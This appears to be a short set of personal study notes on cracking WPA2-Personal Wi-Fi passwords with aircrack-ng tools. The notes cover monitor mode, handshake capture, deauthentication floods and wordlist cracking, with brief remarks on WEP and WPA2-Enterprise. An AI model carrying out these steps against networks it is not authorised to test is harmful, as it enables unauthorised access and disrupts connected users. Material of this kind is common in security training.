WPA2 Cracking
    It's Personal method
    There is a Preshared key (PSK)
    Check WLANs
        ifconfig
        iwconfig
        ip addr show
        airmon-ng
    Create the monitoring device
        airmon-ng start <interface>
        airmon-ng
            show status
    Collecting data
        airodump-ng <monitoring enabled interface>
            it will show SSIDs and MACs
        airodump-ng -w <capture file> -c <channel number> --bssid <AP MAC address> <monitoring enabled interface>
            it will store/capture too many packets of talking to the AP!
            we can wait until get enough packets or force clients via sending Deauth packets to all clients and capture packets when they are authenticating again ;)
            it stores:
                .cap
                .csv
                .kismet.csv
                .kismet.netxml
        airreplay-ng -0 <how many times you want to send a broadcast attack. 0 is unlimited> -a <AP MAC address> <monitoring enabled interface>
            it will sending Deauth packets to broadcast 
        Stop capturing
    Crack
        aircrack-ng <captured file> -w <word list path>
    WEB?
        is the same, but you need about 15000 packets to find a password ;)

WPA2 Enterprise
    There isn't a Key for everyone!
    There are some Authentication methods like Kerberos or Radius to generate a key for a period of time to be valid to be used by clients.
    Even for a specific client!
